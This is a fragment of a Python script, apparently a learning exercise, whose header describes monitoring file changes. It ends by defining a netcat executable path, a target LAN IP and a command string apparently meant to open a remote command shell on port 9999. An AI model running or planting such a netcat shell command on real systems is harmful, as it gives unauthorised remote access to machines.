# monitors changes to files listed in PATHS variable. Records creation, deletion, modification, and more
# Skylar Kooyenga | 11/15/2023 | Python 3.10
...
NETCAT = 'c:\\users\\skylar\\work\\netcat.exe'
TGT_IP = '192.168.1.208'
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -1 c'
